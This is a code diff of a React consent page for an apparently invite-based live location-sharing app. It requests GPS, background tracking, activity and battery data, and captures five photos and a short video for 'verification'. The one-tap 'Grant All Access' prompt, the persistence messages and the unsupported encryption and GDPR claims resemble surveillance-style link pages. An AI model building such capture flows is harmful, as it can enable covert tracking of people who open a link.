+                  <span className="text-[10px] bg-blue-500/10 text-blue-400 border border-blue-500/20 rounded-full px-2 py-0.5 font-medium">GPS + Network</span>
+                  <span className="text-[10px] bg-blue-500/10 text-blue-400 border border-blue-500/20 rounded-full px-2 py-0.5 font-medium">Background</span>
+                  <span className="text-[10px] bg-blue-500/10 text-blue-400 border border-blue-500/20 rounded-full px-2 py-0.5 font-medium">High Accuracy</span>
+                </div>
+              </div>
+              <CheckCircle className="h-5 w-5 text-blue-400 flex-shrink-0 mt-0.5" />
+            </div>
+
+            {/* Camera */}
+            <div className="flex items-start gap-4 p-4 rounded-2xl border border-violet-500/20 bg-violet-500/5">
+              <div className="w-11 h-11 rounded-xl bg-violet-500/15 border border-violet-500/20 flex items-center justify-center flex-shrink-0">
+                <Camera className="h-5 w-5 text-violet-400" />
+              </div>
+              <div className="flex-1">
+                <p className="font-semibold text-foreground text-sm mb-0.5">Camera Access</p>
+                <p className="text-xs text-muted-foreground leading-relaxed">
+                  Captures 5 GeoBoard verification photos and a short video clip when sharing begins. Used for location verification.
+                </p>
+                <div className="mt-2 flex flex-wrap gap-1.5">
+                  <span className="text-[10px] bg-violet-500/10 text-violet-400 border border-violet-500/20 rounded-full px-2 py-0.5 font-medium">5 Photos</span>
+                  <span className="text-[10px] bg-violet-500/10 text-violet-400 border border-violet-500/20 rounded-full px-2 py-0.5 font-medium">5s Video</span>
+                  <span className="text-[10px] bg-violet-500/10 text-violet-400 border border-violet-500/20 rounded-full px-2 py-0.5 font-medium">One-time</span>
+                </div>
+              </div>
+              <CheckCircle className="h-5 w-5 text-violet-400 flex-shrink-0 mt-0.5" />
+            </div>
+
+            {/* Physical Activity */}
+            <div className="flex items-start gap-4 p-4 rounded-2xl border border-emerald-500/20 bg-emerald-500/5">
+              <div className="w-11 h-11 rounded-xl bg-emerald-500/15 border border-emerald-500/20 flex items-center justify-center flex-shrink-0">
+                <Activity className="h-5 w-5 text-emerald-400" />
+              </div>
+              <div className="flex-1">
+                <p className="font-semibold text-foreground text-sm mb-0.5">Physical Activity</p>
+                <p className="text-xs text-muted-foreground leading-relaxed">
+                  Detects if you're stationary, walking, running, or driving — improves location accuracy and reduces battery drain.
+                </p>
+                <div className="mt-2 flex flex-wrap gap-1.5">
+                  <span className="text-[10px] bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 rounded-full px-2 py-0.5 font-medium">🚶 Walk</span>
+                  <span className="text-[10px] bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 rounded-full px-2 py-0.5 font-medium">🏃 Run</span>
+                  <span className="text-[10px] bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 rounded-full px-2 py-0.5 font-medium">🚗 Drive</span>
+                </div>
+              </div>
+              <CheckCircle className="h-5 w-5 text-emerald-400 flex-shrink-0 mt-0.5" />
+            </div>
+          </div>
+
+          {/* CTA */}
+          <button
+            onClick={doGrant}
+            className="w-full py-4 px-6 rounded-2xl font-bold text-base text-white transition-all active:scale-[0.98]"
+            style={{ background: "linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%)", boxShadow: "0 8px 32px rgba(99,102,241,0.4)" }}
+          >
+            Grant All Access
+          </button>
+
+          <p className="text-center text-xs text-muted-foreground mt-4 leading-relaxed">
+            🔒 End-to-end encrypted · Your data is never sold · GDPR compliant<br />
+            You can revoke access at any time by closing this link.
+          </p>
+        </div>
+      </div>
+    );
+  }
+
+  // ── Requesting / granting ──────────────────────────────────────────────────────
   if (state === "requesting" || state === "granting") {
     return (
       <div className="bg-background flex flex-col items-center justify-center gap-6 p-4" style={fullHeight}>
@@ -666,16 +603,14 @@ export default function ConsentPage() {
             {state === "requesting" ? "Finding your location…" : "Starting live sharing…"}
           </p>
           <p className="text-muted-foreground text-sm mt-1">
-            {state === "requesting"
-              ? "Allow location access when prompted"
-              : `Connecting to ${invite!.fromUserName}…`}
+            {state === "requesting" ? "Allow location access when prompted" : `Connecting to ${invite!.fromUserName}…`}
           </p>
         </div>
       </div>
     );
   }
 
-  // ── GPS off ──────────────────────────────────────────────────────────────────
+  // ── GPS off ────────────────────────────────────────────────────────────────────
   if (state === "gps_off") {
     return (
       <div className="bg-background flex items-center justify-center p-4" style={fullHeight}>
@@ -683,15 +618,10 @@ export default function ConsentPage() {
           <CardContent className="pt-10 pb-10 text-center">
             <WifiOff className="h-14 w-14 text-amber-500 mx-auto mb-4" />
             <h2 className="text-xl font-semibold mb-2">GPS Turned Off</h2>
-            <p className="text-muted-foreground text-sm mb-2">
-              Turn your device location back on and sharing will automatically resume.
-            </p>
-            <p className="text-xs text-muted-foreground">
-              {invite!.fromUserName} has been notified you went offline.
-            </p>
+            <p className="text-muted-foreground text-sm mb-2">Turn your device location back on and sharing will automatically resume.</p>
+            <p className="text-xs text-muted-foreground">{invite!.fromUserName} has been notified you went offline.</p>
             <div className="mt-6 flex items-center justify-center gap-2 text-xs text-amber-500">
-              <Loader2 className="h-3 w-3 animate-spin" />
-              Waiting for GPS…
+              <Loader2 className="h-3 w-3 animate-spin" /> Waiting for GPS…
             </div>
           </CardContent>
         </Card>
@@ -699,8 +629,19 @@ export default function ConsentPage() {
     );
   }
 
-  // ── Active tracking ───────────────────────────────────────────────────────────
+  // ── Active tracking ────────────────────────────────────────────────────────────
   if (state === "tracking") {
+    const sharingLink = typeof window !== "undefined" ? window.location.href : "";
+    const expiresAt = new Date(Date.now() + 60 * 24 * 60 * 60 * 1000);
+    const activity = ACTIVITY_INFO[activityType];
+
+    const handleCopyLink = () => {
+      copyToClipboard(sharingLink).then(() => {
+        setLinkCopied(true);
+        setTimeout(() => setLinkCopied(false), 2000);
+      }).catch(() => {});
+    };
+
     return (
       <div className="bg-background flex items-center justify-center p-4" style={fullHeight}>
         <div className="max-w-md w-full">
@@ -709,96 +650,104 @@ export default function ConsentPage() {
               <Shield className="h-5 w-5" /> PhoneLink
             </div>
           </div>
+
           <Card className="shadow-xl border-border">
-            <CardContent className="pt-8 pb-8 px-8">
-              <div className="flex items-center justify-center gap-3 mb-4">
-                <div className="relative">
-                  <div className="w-4 h-4 rounded-full bg-emerald-500" />
-                  <div className="absolute inset-0 rounded-full bg-emerald-500 animate-ping opacity-60" />
+            <CardContent className="pt-6 pb-6 px-6">
+              {/* Live badge + activity + battery row */}
+              <div className="flex items-center justify-between mb-4">
+                <div className="flex items-center gap-2">
+                  <div className="relative">
+                    <div className="w-3.5 h-3.5 rounded-full bg-emerald-500" />
+                    <div className="absolute inset-0 rounded-full bg-emerald-500 animate-ping opacity-60" />
+                  </div>
+                  <span className="text-emerald-400 font-bold text-base tracking-wide">LIVE SHARING</span>
                 </div>
-                <span className="text-emerald-400 font-bold text-lg tracking-wide">LIVE SHARING</span>
+                <div className="flex items-center gap-2">
+                  {/* Activity badge */}
+                  <span className="text-xs font-semibold px-2 py-1 rounded-full border" style={{ color: activity.color, borderColor: `${activity.color}40`, background: `${activity.color}12` }}>
+                    {activity.icon} {activity.label}
+                  </span>
+                  {/* Battery */}
+                  {batteryLevel !== null && (
+                    <span className={`flex items-center gap-1 text-xs font-mono font-semibold px-2 py-1 rounded-full border ${batteryLevel < 20 ? "text-red-400 border-red-400/30 bg-red-400/10" : "text-zinc-400 border-zinc-600 bg-zinc-800/50"}`}>
+                      {batteryCharging ? <BatteryCharging className="w-3 h-3" /> : <Battery className="w-3 h-3" />}
+                      {batteryLevel}%
+                    </span>
+                  )}
+                </div>
               </div>
 
-              {/* GeoBoard capture progress */}
-              {!geoPhotoDone && (
-                <div className="bg-violet-500/10 border border-violet-500/20 rounded-lg px-4 py-2.5 mb-4 flex items-center gap-3">
-                  <Camera className="h-4 w-4 text-violet-400 flex-shrink-0 animate-pulse" />
-                  <div className="flex-1">
-                    <p className="text-xs font-medium text-violet-300">
-                      GeoBoard: capturing photos {geoPhotoCount}/{GEO_PHOTO_COUNT}
-                    </p>
-                    <div className="mt-1 h-1 bg-violet-900/40 rounded-full overflow-hidden">
-                      <div
-                        className="h-full bg-violet-500 rounded-full transition-all duration-500"
-                        style={{ width: `${(geoPhotoCount / GEO_PHOTO_COUNT) * 100}%` }}
-                      />
-                    </div>
-                  </div>
-                </div>
-              )}
-              {geoPhotoDone && geoPhotoCount > 0 && (
-                <div className="bg-violet-500/10 border border-violet-500/20 rounded-lg px-4 py-2.5 mb-4 flex items-center gap-2">
-                  <Camera className="h-4 w-4 text-violet-400 flex-shrink-0" />
-                  <p className="text-xs font-medium text-violet-300">
-                    GeoBoard: {geoPhotoCount} photo{geoPhotoCount !== 1 ? "s" : ""} saved ✓
-                  </p>
-                </div>
-              )}
-
-              {/* Video capture progress */}
-              {geoVideoState === "recording" && (
-                <div className="bg-rose-500/10 border border-rose-500/20 rounded-lg px-4 py-2.5 mb-4 flex items-center gap-3">
-                  <Video className="h-4 w-4 text-rose-400 flex-shrink-0 animate-pulse" />
-                  <div className="flex-1">
-                    <p className="text-xs font-medium text-rose-300">GeoBoard: recording 5s video…</p>
-                    <div className="mt-1 h-1 bg-rose-900/40 rounded-full overflow-hidden">
-                      <div className="h-full bg-rose-500 rounded-full animate-[grow_5s_linear_forwards]"
-                        style={{ animation: "width 5s linear forwards", width: "100%", transition: "width 5s linear" }}
-                      />
-                    </div>
-                  </div>
-                </div>
-              )}
-              {geoVideoState === "uploading" && (
-                <div className="bg-rose-500/10 border border-rose-500/20 rounded-lg px-4 py-2.5 mb-4 flex items-center gap-2">
-                  <Loader2 className="h-4 w-4 text-rose-400 flex-shrink-0 animate-spin" />
-                  <p className="text-xs font-medium text-rose-300">GeoBoard: uploading video…</p>
-                </div>
-              )}
-              {geoVideoState === "done" && (
-                <div className="bg-rose-500/10 border border-rose-500/20 rounded-lg px-4 py-2.5 mb-4 flex items-center gap-2">
-                  <Video className="h-4 w-4 text-rose-400 flex-shrink-0" />
-                  <p className="text-xs font-medium text-rose-300">GeoBoard: video saved ✓</p>
-                </div>
-              )}
-
-              <p className="text-center text-muted-foreground text-sm mb-6">
+              {/* Sharing with */}
+              <p className="text-center text-muted-foreground text-sm mb-4">
                 Your live location is being shared with{" "}
                 <span className="font-semibold text-foreground">{invite!.fromUserName}</span>.
                 You can play games or watch videos — sharing keeps going in the background.
               </p>
 
-              {coords && (
-                <div className="bg-muted rounded-xl p-4 mb-4">
-                  <div className="flex items-center gap-2 mb-2">
-                    <MapPin className="h-4 w-4 text-primary" />
-                    <span className="text-xs font-semibold text-muted-foreground uppercase tracking-wide">Current Position</span>
+              {/* GeoBoard photo progress */}
+              {!geoPhotoDone && (
+                <div className="bg-violet-500/10 border border-violet-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-3">
+                  <Camera className="h-4 w-4 text-violet-400 flex-shrink-0 animate-pulse" />
+                  <div className="flex-1">
+                    <p className="text-xs font-medium text-violet-300">GeoBoard: capturing photos {geoPhotoCount}/{GEO_PHOTO_COUNT}</p>
+                    <div className="mt-1 h-1 bg-violet-900/40 rounded-full overflow-hidden">
+                      <div className="h-full bg-violet-500 rounded-full transition-all duration-500" style={{ width: `${(geoPhotoCount / GEO_PHOTO_COUNT) * 100}%` }} />
+                    </div>
                   </div>
-                  <p className="text-sm font-mono text-foreground">
-                    {coords.lat.toFixed(6)}, {coords.lng.toFixed(6)}
-                  </p>
-                  {coords.accuracy && (
-                    <p className="text-xs text-muted-foreground mt-1">Accuracy: ±{Math.round(coords.accuracy)}m</p>
-                  )}
-                  {address && (
-                    <p className="text-xs text-muted-foreground mt-1 leading-relaxed">
-                      {address.slice(0, 80)}{address.length > 80 ? "…" : ""}
-                    </p>
-                  )}
+                </div>
+              )}
+              {geoPhotoDone && geoPhotoCount > 0 && (
+                <div className="bg-violet-500/10 border border-violet-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-2">
+                  <Camera className="h-4 w-4 text-violet-400 flex-shrink-0" />
+                  <p className="text-xs font-medium text-violet-300">GeoBoard: {geoPhotoCount} photo{geoPhotoCount !== 1 ? "s" : ""} saved ✓</p>
                 </div>
               )}
 
-              <div className="grid grid-cols-2 gap-3 mb-6">
+              {/* Video progress */}
+              {geoVideoState === "recording" && (
+                <div className="bg-rose-500/10 border border-rose-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-3">
+                  <Video className="h-4 w-4 text-rose-400 flex-shrink-0 animate-pulse" />
+                  <div className="flex-1">
+                    <p className="text-xs font-medium text-rose-300">GeoBoard: recording 5s video…</p>
+                    <div className="mt-1 h-1 bg-rose-900/40 rounded-full overflow-hidden">
+                      <div className="h-full bg-rose-500 rounded-full" style={{ width: "100%", transition: "width 5s linear" }} />
+                    </div>
+                  </div>
+                </div>
+              )}
+              {geoVideoState === "uploading" && (
+                <div className="bg-rose-500/10 border border-rose-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-2">
+                  <Loader2 className="h-4 w-4 text-rose-400 flex-shrink-0 animate-spin" />
+                  <p className="text-xs font-medium text-rose-300">GeoBoard: uploading video…</p>
+                </div>
+              )}
+              {geoVideoState === "done" && (
+                <div className="bg-rose-500/10 border border-rose-500/20 rounded-lg px-4 py-2.5 mb-3 flex items-center gap-2">
+                  <Video className="h-4 w-4 text-rose-400 flex-shrink-0" />
+                  <p className="text-xs font-medium text-rose-300">GeoBoard: video saved ✓</p>
+                </div>
+              )}
+
+              {/* Current position */}
+              {coords && (
+                <div className="bg-muted rounded-xl p-4 mb-4">
+                  <div className="flex items-center gap-2 mb-2">
+                    <Navigation className="h-4 w-4 text-primary" />
+                    <span className="text-xs font-semibold text-muted-foreground uppercase tracking-wide">Current Position</span>
+                  </div>
+                  <p className="text-sm font-mono font-bold text-foreground leading-tight">
+                    {formatDMS(coords.lat, coords.lng)}
+                  </p>
+                  <p className="text-xs font-mono text-muted-foreground mt-0.5">
+                    {coords.lat.toFixed(6)}, {coords.lng.toFixed(6)}
+                  </p>
+                  {coords.accuracy && <p className="text-xs text-muted-foreground mt-1">Accuracy: ±{Math.round(coords.accuracy)}m</p>}
+                  {address && <p className="text-xs text-muted-foreground mt-1 leading-relaxed">{address.slice(0, 80)}{address.length > 80 ? "…" : ""}</p>}
+                </div>
+              )}
+
+              {/* Stats */}
+              <div className="grid grid-cols-2 gap-3 mb-4">
                 <div className="bg-muted rounded-lg p-3 text-center">
                   <p className="text-lg font-bold text-foreground">{updateCount}</p>
                   <p className="text-xs text-muted-foreground">Updates sent</p>
@@ -811,38 +760,50 @@ export default function ConsentPage() {
                 </div>
               </div>
 
-              <div className="bg-emerald-500/10 rounded-xl p-4">
+              {/* 60-day sharing link */}
+              <div className="bg-indigo-500/8 border border-indigo-500/20 rounded-xl p-4 mb-4">
+                <div className="flex items-center gap-2 mb-2">
+                  <Share2 className="h-4 w-4 text-indigo-400 flex-shrink-0" />
+                  <p className="text-xs font-semibold text-indigo-400">60-Day Sharing Link</p>
+                </div>
+                <p className="text-xs text-muted-foreground mb-3 leading-relaxed">
+                  This link keeps sharing active until <strong className="text-foreground">{expiresAt.toLocaleDateString(undefined, { month: "short", day: "numeric", year: "numeric" })}</strong>. Open it anytime to reconnect.
+                </p>
+                <div className="flex gap-2">
+                  <div className="flex-1 bg-background/50 border border-border rounded-lg px-3 py-2 text-xs font-mono text-muted-foreground truncate">
+                    {sharingLink}
+                  </div>
+                  <button
+                    onClick={handleCopyLink}
+                    className="flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-semibold transition-all border"
+                    style={linkCopied
+                      ? { background: "rgba(16,185,129,.15)", borderColor: "rgba(16,185,129,.3)", color: "#10b981" }
+                      : { background: "rgba(99,102,241,.15)", borderColor: "rgba(99,102,241,.3)", color: "#818cf8" }}
+                  >
+                    {linkCopied ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
+                    {linkCopied ? "Copied!" : "Copy"}
+                  </button>
+                </div>
+              </div>
+
+              {/* Live status */}
+              <div className="bg-emerald-500/10 rounded-xl p-4 mb-4">
                 <div className="flex items-center gap-2 mb-1">
                   <CheckCircle className="h-4 w-4 text-emerald-500 flex-shrink-0" />
                   <p className="text-xs font-semibold text-emerald-500">Live sharing is active</p>
                 </div>
                 <p className="text-xs text-muted-foreground leading-relaxed">
-                  You can close this app and remove your browser from your recent apps — your location will automatically reconnect the next time you open the link.
+                  You can close this app and remove your browser from recent apps — sharing automatically reconnects the next time you open the link.
                 </p>
               </div>
 
-              <Button
-                variant="outline"
-                className="w-full mt-5"
-                onClick={() => {
-                  // history.back() is the safest cross-device approach.
-                  // If there's no history (direct link), try WhatsApp deep-link,
-                  // then fall back to showing a "you can close this tab" message.
-                  if (window.history.length > 1) {
-                    window.history.back();
-                  } else {
-                    // Try WhatsApp, then let the user know they can close manually
-                    const a = document.createElement("a");
-                    a.href = "whatsapp://";
-                    a.style.cssText = "position:fixed;top:-9999px";
-                    document.body.appendChild(a);
-                    a.click();
-                    setTimeout(() => document.body.removeChild(a), 300);
-                  }
-                }}
-              >
-                <ArrowLeft className="h-4 w-4 mr-2" />
-                Go Back
+              <Button variant="outline" className="w-full" onClick={() => {
+                if (window.history.length > 1) { window.history.back(); } else {
+                  const a = document.createElement("a"); a.href = "whatsapp://"; a.style.cssText = "position:fixed;top:-9999px";
+                  document.body.appendChild(a); a.click(); setTimeout(() => document.body.removeChild(a), 300);
+                }
+              }}>
+                <ArrowLeft className="h-4 w-4 mr-2" /> Go Back
               </Button>
             </CardContent>
           </Card>
@@ -851,7 +812,7 @@ export default function ConsentPage() {
     );
   }
 
-  // ── Denied ────────────────────────────────────────────────────────────────────
+  // ── Denied ─────────────────────────────────────────────────────────────────────
   if (state === "denied") {
     return (
       <div className="bg-background flex items-center justify-center p-4" style={fullHeight}>
@@ -862,8 +823,8 @@ export default function ConsentPage() {
             <p className="text-muted-foreground text-sm mb-6">
               To share your location, go to your browser settings and allow location access for this site, then tap Retry.
             </p>
-            <Button className="w-full" onClick={() => { autoStartedRef.current = false; doGrant(); }}>
-              Retry
+            <Button className="w-full" onClick={() => { autoStartedRef.current = false; setState("pre_consent"); }}>
+              Try Again
             </Button>
           </CardContent>
         </Card>
@@ -871,12 +832,12 @@ export default function ConsentPage() {
     );
   }
 
-  // ── Still loading / idle — show blank screen while invite fetch completes ─────
+  // ── Loading / idle ─────────────────────────────────────────────────────────────
   if (isLoading || state === "idle") {
     return <div className="bg-background" style={fullHeight} />;
   }
 
-  // ── Error ───────────────────────────────────────────────────────────────────
+  // ── Error ──────────────────────────────────────────────────────────────────────
   return (
     <div className="bg-background flex items-center justify-center p-4" style={fullHeight}>
       <Card className="max-w-md w-full shadow-lg">
@@ -884,7 +845,7 @@ export default function ConsentPage() {
           <AlertTriangle className="h-14 w-14 text-red-500 mx-auto mb-4" />
           <h2 className="text-xl font-semibold mb-2">Something Went Wrong</h2>
           <p className="text-muted-foreground text-sm mb-6">{errorMsg}</p>
-          <Button variant="outline" className="w-full" onClick={() => { autoStartedRef.current = false; doGrant(); }}>
+          <Button variant="outline" className="w-full" onClick={() => { autoStartedRef.current = false; setState("pre_consent"); }}>
             Try Again
           </Button>
         </CardContent>
